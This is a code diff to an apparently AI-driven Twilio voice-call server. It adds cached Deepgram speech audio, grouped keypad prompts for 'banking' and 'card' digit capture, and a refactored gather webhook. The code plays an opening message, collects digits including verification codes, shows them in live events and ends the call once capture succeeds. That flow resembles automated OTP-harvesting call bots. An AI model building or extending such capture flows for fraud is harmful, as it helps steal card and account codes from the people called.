@@ -15,14 +15,16 @@ const { TextToSpeechService } = require('./routes/tts');
 const { recordingService } = require('./routes/recording');
 const { EnhancedSmsService } = require('./routes/sms.js');
 const { EmailService } = require('./routes/email');
+const { createTwilioGatherHandler } = require('./routes/gather');
 const Database = require('./db/db');
 const { webhookService } = require('./routes/status');
 const DynamicFunctionEngine = require('./functions/DynamicFunctionEngine');
-const { createDigitCollectionService } = require('./functions/digitCollectionService');
+const { createDigitCollectionService } = require('./functions/Digit');
 const config = require('./config');
 const { AwsConnectAdapter, AwsTtsAdapter, VonageVoiceAdapter } = require('./adapters');
 const { v4: uuidv4 } = require('uuid');
 const apiPackage = require('./package.json');
+const { WaveFile } = require('wavefile');
 
 const twilio = require('twilio');
 const VoiceResponse = twilio.twiml.VoiceResponse;
@@ -128,6 +130,130 @@ function resolveTwilioSayVoice(callConfig) {
   }
   if (model.startsWith('Polly.')) {
     return model;
+  }
+  return null;
+}
+
+function resolveDeepgramVoiceModel(callConfig) {
+  const model = callConfig?.voice_model;
+  if (model && typeof model === 'string') {
+    const normalized = model.toLowerCase();
+    if (!['alice', 'man', 'woman'].includes(normalized) && !model.startsWith('Polly.')) {
+      return model;
+    }
+  }
+  return config.deepgram?.voiceModel || 'aura-asteria-en';
+}
+
+function shouldUseTwilioPlay(callConfig) {
+  if (!config.deepgram?.apiKey) return false;
+  if (!config.server?.hostname) return false;
+  if (config.twilio?.ttsPlayEnabled === false) return false;
+  return true;
+}
+
+function normalizeTwilioTtsText(text = '') {
+  const cleaned = String(text || '').trim();
+  if (!cleaned) return '';
+  if (cleaned.length > TWILIO_TTS_MAX_CHARS) {
+    return '';
+  }
+  return cleaned;
+}
+
+function buildTwilioTtsCacheKey(text, voiceModel) {
+  return crypto
+    .createHash('sha256')
+    .update(`${voiceModel}::${text}`)
+    .digest('hex');
+}
+
+function pruneTwilioTtsCache() {
+  const now = Date.now();
+  for (const [key, entry] of twilioTtsCache.entries()) {
+    if (!entry || entry.expiresAt <= now) {
+      twilioTtsCache.delete(key);
+    }
+  }
+  if (twilioTtsCache.size <= TWILIO_TTS_CACHE_MAX) return;
+  const entries = Array.from(twilioTtsCache.entries())
+    .sort((a, b) => (a[1]?.createdAt || 0) - (b[1]?.createdAt || 0));
+  const overflow = twilioTtsCache.size - TWILIO_TTS_CACHE_MAX;
+  for (let i = 0; i < overflow; i += 1) {
+    const entry = entries[i];
+    if (entry) {
+      twilioTtsCache.delete(entry[0]);
+    }
+  }
+}
+
+async function synthesizeTwilioTtsAudio(text, voiceModel) {
+  const model = voiceModel || resolveDeepgramVoiceModel(null);
+  const url = `https://api.deepgram.com/v1/speak?model=${encodeURIComponent(model)}&encoding=mulaw&sample_rate=8000&container=none`;
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: {
+      Authorization: `Token ${config.deepgram.apiKey}`,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ text }),
+    timeout: TWILIO_TTS_FETCH_TIMEOUT_MS
+  });
+  if (!response.ok) {
+    const errorText = await response.text();
+    console.error('Deepgram TTS error:', response.status, response.statusText, errorText);
+    return null;
+  }
+  const arrayBuffer = await response.arrayBuffer();
+  const mulawBuffer = Buffer.from(arrayBuffer);
+  const wav = new WaveFile();
+  wav.fromScratch(1, 8000, '8m', mulawBuffer);
+  return {
+    buffer: Buffer.from(wav.toBuffer()),
+    contentType: 'audio/wav'
+  };
+}
+
+async function getTwilioTtsAudioUrl(text, callConfig) {
+  const cleaned = normalizeTwilioTtsText(text);
+  if (!cleaned) return null;
+  if (!shouldUseTwilioPlay(callConfig)) return null;
+  const voiceModel = resolveDeepgramVoiceModel(callConfig);
+  const key = buildTwilioTtsCacheKey(cleaned, voiceModel);
+  const now = Date.now();
+  const cached = twilioTtsCache.get(key);
+  if (cached && cached.expiresAt > now) {
+    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
+  }
+  const pending = twilioTtsPending.get(key);
+  if (pending) {
+    await pending;
+    const refreshed = twilioTtsCache.get(key);
+    if (refreshed && refreshed.expiresAt > Date.now()) {
+      return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
+    }
+    return null;
+  }
+  const job = (async () => {
+    try {
+      const audio = await synthesizeTwilioTtsAudio(cleaned, voiceModel);
+      if (!audio) return;
+      twilioTtsCache.set(key, {
+        ...audio,
+        createdAt: Date.now(),
+        expiresAt: Date.now() + TWILIO_TTS_CACHE_TTL_MS
+      });
+      pruneTwilioTtsCache();
+    } catch (err) {
+      console.error('Twilio TTS synthesis error:', err);
+    }
+  })();
+  twilioTtsPending.set(key, job);
+  await job;
+  twilioTtsPending.delete(key);
+  const refreshed = twilioTtsCache.get(key);
+  if (refreshed && refreshed.expiresAt > Date.now()) {
+    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
   }
   return null;
 }
@@ -468,6 +594,55 @@ function estimateSpeechDurationMs(text = '') {
   return Math.ceil((words / wordsPerMinute) * 60000);
 }
 
+function isGroupedGatherPlan(plan, callConfig = {}) {
+  if (!plan) return false;
+  const provider = callConfig?.provider || currentProvider;
+  return provider === 'twilio'
+    && ['banking', 'card'].includes(plan.group_id)
+    && plan.capture_mode === 'ivr_gather'
+    && callConfig?.digit_capture_active === true;
+}
+
+function startGroupedGather(callSid, callConfig, options = {}) {
+  if (!callSid || !digitService?.sendTwilioGather || !digitService?.getPlan) return false;
+  const plan = digitService.getPlan(callSid);
+  if (!isGroupedGatherPlan(plan, callConfig)) return false;
+  const expectation = digitService.getExpectation(callSid);
+  if (!expectation) return false;
+  if (expectation.prompted_at && options.force !== true) return false;
+  const prompt = digitService.buildPlanStepPrompt
+    ? digitService.buildPlanStepPrompt(expectation)
+    : (expectation.prompt || digitService.buildDigitPrompt(expectation));
+  if (!prompt) return false;
+  const sayVoice = resolveTwilioSayVoice(callConfig);
+  const sayOptions = sayVoice ? { voice: sayVoice } : null;
+  const delayMs = Math.max(0, Number.isFinite(options.delayMs) ? options.delayMs : 0);
+  const preamble = options.preamble || '';
+  setTimeout(async () => {
+    try {
+      const activePlan = digitService.getPlan(callSid);
+      const activeExpectation = digitService.getExpectation(callSid);
+      if (!activePlan || !activeExpectation) return;
+      if (!isGroupedGatherPlan(activePlan, callConfig)) return;
+      if (activeExpectation.prompted_at && options.force !== true) return;
+      if (activeExpectation.plan_id && activePlan.id && activeExpectation.plan_id !== activePlan.id) return;
+      const usePlay = shouldUseTwilioPlay(callConfig);
+      const preambleUrl = usePlay ? await getTwilioTtsAudioUrl(preamble, callConfig) : null;
+      const promptUrl = usePlay ? await getTwilioTtsAudioUrl(prompt, callConfig) : null;
+      await digitService.sendTwilioGather(callSid, activeExpectation, {
+        prompt,
+        preamble,
+        promptUrl,
+        preambleUrl,
+        sayOptions
+      });
+    } catch (err) {
+      console.error('Grouped gather start error:', err);
+    }
+  }, delayMs);
+  return true;
+}
+
 function clearSpeechTicks(callSid) {
   const timer = speechTickTimers.get(callSid);
   if (timer) {
@@ -549,11 +724,15 @@ async function applyInitialDigitIntent(callSid, callConfig, gptService = null, i
   }
   if (result.intent?.mode === 'dtmf' && Array.isArray(result.plan_steps) && result.plan_steps.length) {
     webhookService.addLiveEvent(callSid, `🧭 Digit capture plan started (${result.intent.group_id || 'group'})`, { force: true });
+    const provider = callConfig?.provider || currentProvider;
+    const isGroupedPlan = ['banking', 'card'].includes(result.intent.group_id);
+    const deferTwiml = provider === 'twilio' && isGroupedPlan;
     await digitService.requestDigitCollectionPlan(callSid, {
       steps: result.plan_steps,
       end_call_on_success: true,
       group_id: result.intent.group_id,
-      capture_mode: 'ivr_gather'
+      capture_mode: 'ivr_gather',
+      defer_twiml: deferTwiml
     }, gptService);
     return result;
   }
@@ -723,6 +902,12 @@ const gatherEventDedupe = new Map();
 const silenceTimers = new Map();
 const transcriptAudioJobs = new Map();
 const TRANSCRIPT_AUDIO_TTL_MS = 60 * 60 * 1000;
+const twilioTtsCache = new Map();
+const twilioTtsPending = new Map();
+const TWILIO_TTS_CACHE_TTL_MS = Number(config.twilio?.ttsCacheTtlMs) || 10 * 60 * 1000;
+const TWILIO_TTS_CACHE_MAX = Number(config.twilio?.ttsCacheMax) || 200;
+const TWILIO_TTS_MAX_CHARS = Number(config.twilio?.ttsMaxChars) || 500;
+const TWILIO_TTS_FETCH_TIMEOUT_MS = Number(config.twilio?.ttsFetchTimeoutMs) || 4000;
 const pendingStreams = new Map(); // callSid -> timeout to detect missing websocket
 const gptQueues = new Map();
 const normalFlowBuffers = new Map();
@@ -1831,6 +2016,7 @@ app.ws('/connection', (ws, req) => {
               if (pendingDigitActions.length) {
                 await handlePendingDigitActions(callSid, pendingDigitActions, gptService, interactionCount);
               }
+              startGroupedGather(callSid, callConfig, { preamble: '' });
             } else {
             await recordingService(ttsService, callSid);
             
@@ -1842,9 +2028,42 @@ app.ws('/connection', (ws, req) => {
               && activePlan.capture_mode === 'ivr_gather'
             );
             const fallbackPrompt = 'One moment while I pull that up.';
+            if (isGroupedGather) {
+              const firstMessage = (callConfig && callConfig.first_message)
+                ? callConfig.first_message
+                : fallbackPrompt;
+              const preamble = callConfig?.initial_prompt_played ? '' : firstMessage;
+              if (callConfig) {
+                callConfig.initial_prompt_played = true;
+                callConfigurations.set(callSid, callConfig);
+              }
+              if (preamble) {
+                try {
+                  await db.addTranscript({
+                    call_sid: callSid,
+                    speaker: 'ai',
+                    message: preamble,
+                    interaction_count: 0,
+                    personality_used: 'default'
+                  });
+                } catch (dbError) {
+                  console.error('Database error adding initial transcript:', dbError);
+                }
+                webhookService.recordTranscriptTurn(callSid, 'agent', preamble);
+              }
+              startGroupedGather(callSid, callConfig, { preamble });
+              scheduleSilenceTimer(callSid);
+              isInitialized = true;
+              if (pendingDigitActions.length) {
+                await handlePendingDigitActions(callSid, pendingDigitActions, gptService, interactionCount);
+              }
+              console.log('Adaptive call initialization complete');
+              return;
+            }
+
             const firstMessage = (callConfig && callConfig.first_message)
               ? callConfig.first_message
-              : (initialExpectation && !isGroupedGather ? digitService.buildDigitPrompt(initialExpectation) : fallbackPrompt);
+              : (initialExpectation ? digitService.buildDigitPrompt(initialExpectation) : fallbackPrompt);
             
             console.log(`First message (${functionSystem?.context.industry || 'default'}): ${firstMessage.substring(0, 50)}...`);
             let promptUsed = firstMessage;
@@ -1884,16 +2103,15 @@ app.ws('/connection', (ws, req) => {
               callConfig.initial_prompt_played = true;
               callConfigurations.set(callSid, callConfig);
             }
-            if (digitService?.hasExpectation(callSid)) {
+            if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
               digitService.markDigitPrompted(callSid, gptService, interactionCount, 'dtmf', {
                 allowCallEnd: true,
                 prompt_text: promptUsed
               });
-              if (!isGroupedGather) {
-                digitService.scheduleDigitTimeout(callSid, gptService, 0);
-              }
+              digitService.scheduleDigitTimeout(callSid, gptService, 0);
             }
             scheduleSilenceTimer(callSid);
+            startGroupedGather(callSid, callConfig, { preamble: '', delayMs: estimateSpeechDurationMs(promptUsed) + 200 });
             
             isInitialized = true;
             if (pendingDigitActions.length) {
@@ -1910,6 +2128,7 @@ app.ws('/connection', (ws, req) => {
               if (pendingDigitActions.length) {
                 await handlePendingDigitActions(callSid, pendingDigitActions, gptService, interactionCount);
               }
+              startGroupedGather(callSid, callConfig, { preamble: '' });
             } else {
             
             const initialExpectation = digitService?.getExpectation(callSid);
@@ -1920,9 +2139,38 @@ app.ws('/connection', (ws, req) => {
               && activePlan.capture_mode === 'ivr_gather'
             );
             const fallbackPrompt = 'One moment while I pull that up.';
+            if (isGroupedGather) {
+              const firstMessage = (callConfig && callConfig.first_message)
+                ? callConfig.first_message
+                : fallbackPrompt;
+              const preamble = callConfig?.initial_prompt_played ? '' : firstMessage;
+              if (callConfig) {
+                callConfig.initial_prompt_played = true;
+                callConfigurations.set(callSid, callConfig);
+              }
+              if (preamble) {
+                try {
+                  await db.addTranscript({
+                    call_sid: callSid,
+                    speaker: 'ai',
+                    message: preamble,
+                    interaction_count: 0,
+                    personality_used: 'default'
+                  });
+                } catch (dbError) {
+                  console.error('Database error adding initial transcript:', dbError);
+                }
+                webhookService.recordTranscriptTurn(callSid, 'agent', preamble);
+              }
+              startGroupedGather(callSid, callConfig, { preamble });
+              scheduleSilenceTimer(callSid);
+              isInitialized = true;
+              return;
+            }
+
             const firstMessage = (callConfig && callConfig.first_message)
               ? callConfig.first_message
-              : (initialExpectation && !isGroupedGather ? digitService.buildDigitPrompt(initialExpectation) : fallbackPrompt);
+              : (initialExpectation ? digitService.buildDigitPrompt(initialExpectation) : fallbackPrompt);
             
             let promptUsed = firstMessage;
             try {
@@ -1961,16 +2209,15 @@ app.ws('/connection', (ws, req) => {
               callConfig.initial_prompt_played = true;
               callConfigurations.set(callSid, callConfig);
             }
-            if (digitService?.hasExpectation(callSid)) {
+            if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
               digitService.markDigitPrompted(callSid, gptService, interactionCount, 'dtmf', {
                 allowCallEnd: true,
                 prompt_text: promptUsed
               });
-              if (!isGroupedGather) {
-                digitService.scheduleDigitTimeout(callSid, gptService, 0);
-              }
+              digitService.scheduleDigitTimeout(callSid, gptService, 0);
             }
             scheduleSilenceTimer(callSid);
+            startGroupedGather(callSid, callConfig, { preamble: '', delayMs: estimateSpeechDurationMs(promptUsed) + 200 });
             
             isInitialized = true;
             }
@@ -2044,8 +2291,11 @@ app.ws('/connection', (ws, req) => {
         } else if (event === 'stop') {
           console.log(`Adaptive call stream ${streamSid} ended`.red);
 
-          if (digitService?.isFallbackActive?.(callSid)) {
-            console.log(`📟 Stream stopped during Gather fallback for ${callSid}; preserving call state.`);
+          const activePlan = digitService?.getPlan?.(callSid);
+          const isGatherPlan = activePlan?.capture_mode === 'ivr_gather';
+          if (digitService?.isFallbackActive?.(callSid) || isGatherPlan) {
+            const reason = digitService?.isFallbackActive?.(callSid) ? 'Gather fallback' : 'IVR gather';
+            console.log(`📟 Stream stopped during ${reason} for ${callSid}; preserving call state.`);
             activeCalls.delete(callSid);
             clearCallEndLock(callSid);
             clearSilenceTimer(callSid);
@@ -4928,8 +5178,8 @@ app.post('/webhook/sms', async (req, res) => {
 });
 
 app.post('/webhook/sms-status', async (req, res) => {
-    try {
-        warnOnInvalidTwilioSignature(req, '/webhook/sms-status');
+  try {
+    warnOnInvalidTwilioSignature(req, '/webhook/sms-status');
         const { MessageSid, MessageStatus, ErrorCode, ErrorMessage } = req.body;
 
         console.log(`SMS status update: ${MessageSid} -> ${MessageStatus}`);
@@ -4947,12 +5197,29 @@ app.post('/webhook/sms-status', async (req, res) => {
     } catch (error) {
         console.error('SMS status webhook error:', error);
         res.status(500).send('OK'); // Return OK to prevent retries
-    }
+  }
+});
+
+app.get('/webhook/twilio-tts', (req, res) => {
+  const key = String(req.query?.key || '').trim();
+  if (!key) {
+    res.status(400).send('Missing key');
+    return;
+  }
+  const entry = twilioTtsCache.get(key);
+  if (!entry || entry.expiresAt <= Date.now()) {
+    twilioTtsCache.delete(key);
+    res.status(404).send('Not found');
+    return;
+  }
+  res.set('Cache-Control', `public, max-age=${Math.floor(TWILIO_TTS_CACHE_TTL_MS / 1000)}`);
+  res.type(entry.contentType || 'audio/wav');
+  res.send(entry.buffer);
 });
 
 // Email webhook endpoints
 app.post('/webhook/email', async (req, res) => {
-    try {
+  try {
         if (!emailService) {
             return res.status(500).json({ success: false, error: 'Email service not initialized' });
         }
@@ -4987,238 +5254,30 @@ app.get('/webhook/email-unsubscribe', async (req, res) => {
     }
 });
 
-// Twilio Gather fallback handler (DTMF)
-app.post('/webhook/twilio-gather', async (req, res) => {
-  try {
-    warnOnInvalidTwilioSignature(req, '/webhook/twilio-gather');
-    const { CallSid, Digits } = req.body || {};
-    const callSid = req.query?.callSid || CallSid;
-    if (!callSid) {
-      return res.status(400).send('Missing CallSid');
-    }
-    console.log(`Gather webhook hit: callSid=${callSid} digits=${maskDigitsForLog(Digits || '')}`);
-
-    let expectation = digitService?.getExpectation(callSid);
-    if (!expectation) {
-      const callConfig = callConfigurations.get(callSid) || {};
-      const groupId = digitService?.getLockedGroup ? digitService.getLockedGroup(callConfig) : null;
-      if (groupId && digitService?.requestDigitCollectionPlan) {
-        await digitService.requestDigitCollectionPlan(callSid, {
-          group_id: groupId,
-          steps: [],
-          end_call_on_success: true,
-          capture_mode: 'ivr_gather',
-          defer_twiml: true
-        });
-        expectation = digitService.getExpectation(callSid);
-      }
-    }
-    if (!expectation) {
-      console.warn(`Gather webhook had no expectation for ${callSid}`);
-      const response = new VoiceResponse();
-      response.say('We could not start digit capture. Goodbye.');
-      response.hangup();
-      res.type('text/xml');
-      res.end(response.toString());
-      return;
-    }
-
-    const host = resolveHost(req);
-    const respondWithGather = (exp, promptText = '', followupText = '') => {
-      try {
-        const twiml = digitService.buildTwilioGatherTwiml(
-          callSid,
-          exp,
-          { prompt: promptText, followup: followupText },
-          host
-        );
-        res.type('text/xml');
-        res.end(twiml);
-        return true;
-      } catch (err) {
-        console.error('Twilio gather build error:', err);
-        return false;
-      }
-    };
-    const respondWithStream = () => {
-      const twiml = buildTwilioStreamTwiml(host);
-      res.type('text/xml');
-      res.end(twiml);
-    };
-    const respondWithHangup = (message) => {
-      if (callEndLocks.has(callSid)) {
-        respondWithStream();
-        return;
-      }
-      callEndLocks.set(callSid, true);
-      const response = new VoiceResponse();
-      if (message) {
-        response.say(message);
-      }
-      response.hangup();
-      res.type('text/xml');
-      res.end(response.toString());
-    };
-
-    digitService.clearDigitTimeout(callSid);
-
-    const dedupeKey = `${callSid}:${Digits || ''}`;
-    const lastSeen = gatherEventDedupe.get(dedupeKey);
-    if (lastSeen && Date.now() - lastSeen < 2000) {
-      console.warn(`Duplicate gather webhook ignored for ${callSid}`);
-      const currentExpectation = digitService?.getExpectation(callSid);
-      if (currentExpectation) {
-        const prompt = currentExpectation.prompt || digitService.buildDigitPrompt(currentExpectation);
-        if (respondWithGather(currentExpectation, prompt)) {
-          return;
-        }
-      }
-      respondWithStream();
-      return;
-    }
-    gatherEventDedupe.set(dedupeKey, Date.now());
-
-    const digits = String(Digits || '').trim();
-    if (digits) {
-      const expectation = digitService.getExpectation(callSid);
-      const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
-      const hadPlan = !!expectation?.plan_id;
-      const planEndOnSuccess = plan ? plan.end_call_on_success !== false : true;
-      const planCompletionMessage = plan?.completion_message || '';
-      const callConfig = callConfigurations.get(callSid) || {};
-      const isGroupedPlan = Boolean(
-        plan
-        && ['banking', 'card'].includes(plan.group_id)
-        && callConfig.call_mode === 'dtmf_capture'
-        && callConfig.digit_capture_active === true
-      );
-      const shouldEndOnSuccess = expectation?.end_call_on_success !== false;
-      const display = expectation?.profile === 'verification'
-        ? digitService.formatOtpForDisplay(digits, 'progress', expectation?.max_digits)
-        : `Keypad (Gather): ${digits}`;
-      webhookService.addLiveEvent(callSid, `🔢 ${display}`, { force: true });
-      const collection = digitService.recordDigits(callSid, digits, { timestamp: Date.now() });
-      await digitService.handleCollectionResult(callSid, collection, null, 0, 'gather', { allowCallEnd: true, deferCallEnd: true });
-
-      if (collection.accepted) {
-        const nextExpectation = digitService.getExpectation(callSid);
-        if (nextExpectation?.plan_id) {
-          const stepPrompt = digitService.buildPlanStepPrompt
-            ? digitService.buildPlanStepPrompt(nextExpectation)
-            : (nextExpectation.prompt || digitService.buildDigitPrompt(nextExpectation));
-          const nextPrompt = isGroupedPlan ? `Thanks. ${stepPrompt}` : stepPrompt;
-          clearPendingDigitReprompts(callSid);
-          digitService.clearDigitTimeout(callSid);
-          digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: nextPrompt });
-          if (respondWithGather(nextExpectation, nextPrompt)) {
-            return;
-          }
-        } else if (hadPlan) {
-          clearPendingDigitReprompts(callSid);
-          const profile = expectation?.profile || collection.profile;
-          const completionMessage = planCompletionMessage
-            || (digitService?.buildClosingMessage ? digitService.buildClosingMessage(profile) : CLOSING_MESSAGE);
-          if (planEndOnSuccess) {
-            respondWithHangup(completionMessage);
-            return;
-          }
-        } else if (shouldEndOnSuccess) {
-          clearPendingDigitReprompts(callSid);
-          const profile = expectation?.profile || collection.profile;
-          const completionMessage = digitService?.buildClosingMessage
-            ? digitService.buildClosingMessage(profile)
-            : CLOSING_MESSAGE;
-          respondWithHangup(completionMessage);
-          return;
-        }
-
-        queuePendingDigitAction(callSid, {
-          type: 'reprompt',
-          text: 'Thanks. One moment please.',
-          scheduleTimeout: false
-        });
-        respondWithStream();
-        return;
-      }
-
-      if (collection.fallback) {
-        const failureMessage = expectation?.failure_message || CALL_END_MESSAGES.failure;
-        clearPendingDigitReprompts(callSid);
-        respondWithHangup(failureMessage);
-        return;
-      }
-
-      const attemptCount = collection.attempt_count || expectation?.attempt_count || collection.retries || 1;
-      let reprompt = digitService?.buildAdaptiveReprompt
-        ? digitService.buildAdaptiveReprompt(expectation || {}, collection.reason, attemptCount)
-        : '';
-      if (!reprompt) {
-        reprompt = expectation ? digitService.buildDigitPrompt(expectation) : 'Please enter the digits again.';
-      }
-      clearPendingDigitReprompts(callSid);
-      digitService.clearDigitTimeout(callSid);
-      digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: reprompt });
-      if (respondWithGather(expectation, reprompt)) {
-        return;
-      }
-      respondWithStream();
-      return;
-    }
-
-    const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
-    const callConfig = callConfigurations.get(callSid) || {};
-    const isGroupedPlan = Boolean(
-      plan
-      && ['banking', 'card'].includes(plan.group_id)
-      && callConfig.call_mode === 'dtmf_capture'
-      && callConfig.digit_capture_active === true
-    );
-    if (isGroupedPlan) {
-      const timeoutMessage = expectation.timeout_failure_message || CALL_END_MESSAGES.no_response;
-      clearPendingDigitReprompts(callSid);
-      digitService.clearDigitFallbackState(callSid);
-      digitService.clearDigitPlan(callSid);
-      if (digitService?.updatePlanState) {
-        digitService.updatePlanState(callSid, plan, 'FAIL', { step_index: expectation?.plan_step_index, reason: 'timeout' });
-      }
-      callConfig.digit_capture_active = false;
-      if (callConfig.call_mode === 'dtmf_capture') {
-        callConfig.call_mode = 'normal';
-      }
-      callConfigurations.set(callSid, callConfig);
-      respondWithHangup(timeoutMessage);
-      return;
-    }
-
-    expectation.retries = (expectation.retries || 0) + 1;
-    digitService.expectations.set(callSid, expectation);
-
-    if (expectation.retries > expectation.max_retries) {
-      const timeoutMessage = expectation.timeout_failure_message || CALL_END_MESSAGES.no_response;
-      clearPendingDigitReprompts(callSid);
-      digitService.clearDigitFallbackState(callSid);
-      digitService.clearDigitPlan(callSid);
-      respondWithHangup(timeoutMessage);
-      return;
-    }
-
-    const timeoutPrompt = digitService?.buildTimeoutPrompt
-      ? digitService.buildTimeoutPrompt(expectation, expectation.retries || 1)
-      : (expectation.reprompt_timeout
-        || expectation.reprompt_message
-        || 'I did not receive any input. Please enter the code using your keypad.');
-    clearPendingDigitReprompts(callSid);
-    digitService.clearDigitTimeout(callSid);
-    digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: timeoutPrompt });
-    if (respondWithGather(expectation, timeoutPrompt)) {
-      return;
-    }
-    respondWithStream();
-  } catch (error) {
-    console.error('Twilio gather webhook error:', error);
-    res.status(500).send('Error');
-  }
+const twilioGatherHandler = createTwilioGatherHandler({
+  warnOnInvalidTwilioSignature,
+  getDigitService: () => digitService,
+  callConfigurations,
+  config,
+  VoiceResponse,
+  webhookService,
+  resolveHost,
+  buildTwilioStreamTwiml,
+  clearPendingDigitReprompts,
+  callEndLocks,
+  gatherEventDedupe,
+  maskDigitsForLog,
+  callEndMessages: CALL_END_MESSAGES,
+  closingMessage: CLOSING_MESSAGE,
+  queuePendingDigitAction,
+  getTwilioTtsAudioUrl,
+  shouldUseTwilioPlay,
+  resolveTwilioSayVoice,
+  isGroupedGatherPlan
 });
+
+// Twilio Gather fallback handler (DTMF)
+app.post('/webhook/twilio-gather', twilioGatherHandler);
 
 // Email API endpoints
 app.post('/email/send', async (req, res) => {
